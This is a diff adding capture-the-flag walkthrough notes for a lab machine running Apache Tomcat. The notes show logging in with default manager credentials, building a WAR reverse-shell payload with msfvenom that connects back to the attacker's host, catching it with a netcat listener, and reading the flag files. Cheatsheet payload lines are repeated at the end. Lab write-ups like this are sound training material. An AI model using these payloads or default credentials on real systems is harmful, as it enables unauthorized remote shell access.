@@ -1,0 +1,80 @@
+#####################
+# Sources and Links #
+#####################
+Creating Metasploit payloads with msfvenom
+https://netsec.ws/?p=331
+
+Reverse shell cheatsheet / msfvenom payload help
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+#########
+# TL,DR #
+#########
+An apache web server with default login credentials lets us upload files to the server.
+We can generate a war payload using msfvenom, granting a reverse shell that kali catches with netcat.
+Then simply read the flags (with 'type' command) at C:\Users\Administrator\Desktop\flags
+
+########
+# Hack #
+########
+nmap shows an apache tomcat server on 8080
+We can browse to 10.10.10.65:8080
+There is a link there to a Tomcat Manager Application that prompts for a user:password
+Luckily, there are several helpful lists in
+/usr/share/wordlists/tomcat_mgr_default*
+
+But we don't even need it! The default credentials aren't changed!
+tomcat:s3cret grants access to the TMA.
+
+There's an option to deploy a WAR file onto the server.
+There's also some useful information that may be helpful for a payload:
+
+Server Information
+Tomcat Version : Apache Tomcat/6.0.88 	
+JVM Version : 1.8.0_171-b1 	
+JVM Vendor : Orcale	
+OS Name : Windows Server 2012 R2 	
+OS Version : 6.3
+OS Architecture : amd64	
+Hostname : Jerry
+IP Address : 10.10.10.95
+
+Let's find an appropriate payload.
+msfvenom -l payloads | grep java | grep reverse | grep tcp
+    java/jsp_shell_reverse_tcp                          Connect back to attacker and spawn a command shell
+    java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager
+    java/shell/reverse_tcp                              Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
+    java/shell_reverse_tcp                              Connect back to attacker and spawn a command shell
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=3333 -f war > javaShell.war
+Upload javaShell.war to the Apache server. Now we need to activate it.
+Inspect javaShell.war on kali to see the name of the file.
+Either unzip javaShell.war with jar -xvf javaShell.war
+or strings javaShell.war | grep jsp
+eqvvwwqwmrx.jsp
+
+Open up a netcat listener on kali
+nc -lvnp 3333
+
+On victim: navigate to http://10.10.10.95:8080/javaShell/eqvvwwqwmrx.jsp
+Shell granted!
+
+cd C:\Users\Administrator\Desktop\flags
+type 2*.txt
+
+user.txt
+OUTPUT REDACTED FOR WALKTHROUGH 
+
+root.txt
+OUTPUT REDACTED FOR WALKTHROUGH
+
+###########
+# Learned #
+###########
+Using msfpayload to create a reverse TCP shell
+Searching msfpayload like so:
+msfvenom -l payloads | grep java | grep reverse | grep tcp
+
+From ~/Cheatsheets/Reverse_Shell_Cheatsheets.md
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
+strings reverse.war | grep jsp # in order to get the name of the file
